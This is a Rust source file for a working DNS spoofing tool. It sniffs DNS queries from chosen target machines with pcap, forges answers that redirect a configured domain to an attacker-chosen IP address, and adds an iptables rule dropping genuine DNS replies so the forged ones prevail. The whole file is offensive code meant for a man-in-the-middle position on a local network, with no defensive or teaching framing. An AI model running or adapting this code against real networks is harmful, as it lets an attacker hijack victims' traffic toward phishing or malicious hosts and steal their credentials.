use pcap::{Capture, Active, Error};
use std::io;
use std::net::Ipv4Addr;
use std::process::Command;

pub struct DnsSpoofConfig {
    pub domain: String,
    pub redirect_ip: Ipv4Addr,
    pub our_mac: [u8; 6],
}

pub fn encode_domain(domain: &str) -> Vec<u8> {
    let mut result = Vec::new();
    for part in domain.split('.') {
        result.push(part.len() as u8);
        result.extend_from_slice(part.as_bytes());
    }
    result.push(0x00);
    result
}

pub fn process_dns_request(
    cap: &mut Capture<Active>,
    data: &[u8],
    config: &DnsSpoofConfig,
    target_ips: &[Ipv4Addr],
    target_macs: &[[u8; 6]],
) -> Result<(), Error> {
    if data.len() < 42 { return Ok(()); }

    if data[12..14] != [0x08, 0x00] { return Ok(()); }

    let ihl = (data[14] & 0x0f) as usize;
    let ip_header_len = ihl * 4;
    if ip_header_len < 20 || 14 + ip_header_len + 8 + 12 > data.len() { return Ok(()); }

    if data[23] != 0x11 { return Ok(()); }

    let udp_offset = 14 + ip_header_len;

    let dst_port = u16::from_be_bytes([data[udp_offset + 2], data[udp_offset + 3]]);
    if dst_port != 53 { return Ok(()); }

    let src_port = u16::from_be_bytes([data[udp_offset], data[udp_offset + 1]]);

    let src_ip = Ipv4Addr::from([data[26], data[27], data[28], data[29]]);
    let dns_server = Ipv4Addr::from([data[30], data[31], data[32], data[33]]);

    let target_idx = match target_ips.iter().position(|&ip| ip == src_ip) {
        Some(idx) => idx,
        None => return Ok(()),
    };
    let dst_mac = target_macs[target_idx];

    let dns_offset = udp_offset + 8;

    let txid = [data[dns_offset], data[dns_offset + 1]];
    let flags = [data[dns_offset + 2], data[dns_offset + 3]];

    if (flags[0] & 0x80) != 0 { return Ok(()); }

    let qdcount = u16::from_be_bytes([data[dns_offset + 4], data[dns_offset + 5]]);
    if qdcount == 0 { return Ok(()); }

    let mut pos = dns_offset + 12;
    let mut domain_labels = Vec::new();
    while pos < data.len() {
        let len_byte = data[pos];
        if len_byte == 0 { pos += 1; break; }
        if len_byte & 0xc0 == 0xc0 { pos += 2; break; }
        let len = len_byte as usize;
        if pos + 1 + len > data.len() { return Ok(()); }
        domain_labels.extend_from_slice(&data[pos + 1..pos + 1 + len]);
        domain_labels.push(b'.');
        pos += 1 + len;
    }

    if domain_labels.is_empty() { return Ok(()); }
    domain_labels.pop();

    let query_domain = String::from_utf8_lossy(&domain_labels).to_lowercase();
    let target_lower = config.domain.to_lowercase();
    if query_domain != target_lower && !query_domain.ends_with(&format!(".{}", target_lower)) {
        return Ok(());
    }

    if pos + 4 > data.len() { return Ok(()); }
    let qtype = u16::from_be_bytes([data[pos], data[pos + 1]]);
    if qtype != 1 { return Ok(()); }

    let domain_wire = encode_domain(&query_domain);
    send_dns_response(cap, dst_mac, config.our_mac, src_ip, dns_server, src_port, txid, &domain_wire, config.redirect_ip)?;

    Ok(())
}

fn send_dns_response(
    cap: &mut Capture<Active>,
    dst_mac: [u8; 6],
    src_mac: [u8; 6],
    dst_ip: Ipv4Addr,
    src_ip: Ipv4Addr,
    src_port: u16,
    txid: [u8; 2],
    domain_wire: &[u8],
    redirect_ip: Ipv4Addr,
) -> Result<(), Error> {
    let domain_len = domain_wire.len();
    let question_len = domain_len + 4;
    let answer_len = 16u16;
    let dns_body_len = 12 + question_len + answer_len as usize;
    let ip_total_len = 20 + 8 + dns_body_len;
    let udp_len = 8 + dns_body_len;

    let mut packet = Vec::with_capacity(14 + ip_total_len);

    packet.extend_from_slice(&dst_mac);
    packet.extend_from_slice(&src_mac);
    packet.extend_from_slice(&[0x08, 0x00]);

    let ip_id: u16 = 0x1337;
    let src_octets = src_ip.octets();
    let dst_octets = dst_ip.octets();

    let mut ip_header = vec![
        0x45,
        0x00,
        (ip_total_len >> 8) as u8, (ip_total_len & 0xff) as u8,
        (ip_id >> 8) as u8, (ip_id & 0xff) as u8,
        0x40, 0x00,
        0x40,
        0x11,
        0x00, 0x00,
    ];
    ip_header.extend_from_slice(&src_octets);
    ip_header.extend_from_slice(&dst_octets);

    let mut csum: u32 = 0;
    for i in 0..10 {
        let word = u16::from_be_bytes([ip_header[i * 2], ip_header[i * 2 + 1]]);
        csum += word as u32;
    }
    while csum > 0xffff {
        csum = (csum & 0xffff) + (csum >> 16);
    }
    let checksum = !(csum as u16);
    ip_header[10] = (checksum >> 8) as u8;
    ip_header[11] = (checksum & 0xff) as u8;

    packet.extend_from_slice(&ip_header);

    packet.extend_from_slice(&[
        0x00, 0x35,
        (src_port >> 8) as u8, (src_port & 0xff) as u8,
        (udp_len >> 8) as u8, (udp_len & 0xff) as u8,
        0x00, 0x00,
    ]);

    packet.extend_from_slice(&txid);
    packet.extend_from_slice(&[0x81, 0x80]);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);

    packet.extend_from_slice(domain_wire);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x00, 0x01]);

    let redirect_octets = redirect_ip.octets();
    packet.extend_from_slice(&[0xc0, 0x0c]);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]);
    packet.extend_from_slice(&[0x00, 0x04]);
    packet.extend_from_slice(&redirect_octets);

    cap.sendpacket(packet.as_slice())?;
    Ok(())
}

pub fn block_dns_responses() -> io::Result<()> {
    let check = Command::new("iptables")
        .args(["-C", "FORWARD", "-p", "udp", "--sport", "53", "-j", "DROP"])
        .output();
    match check {
        Ok(output) if output.status.success() => return Ok(()),
        _ => {}
    }
    Command::new("iptables")
        .args(["-A", "FORWARD", "-p", "udp", "--sport", "53", "-j", "DROP"])
        .status()?;
    Ok(())
}

pub fn restore_dns_responses() {
    let _ = Command::new("iptables")
        .args(["-D", "FORWARD", "-p", "udp", "--sport", "53", "-j", "DROP"])
        .status();
}
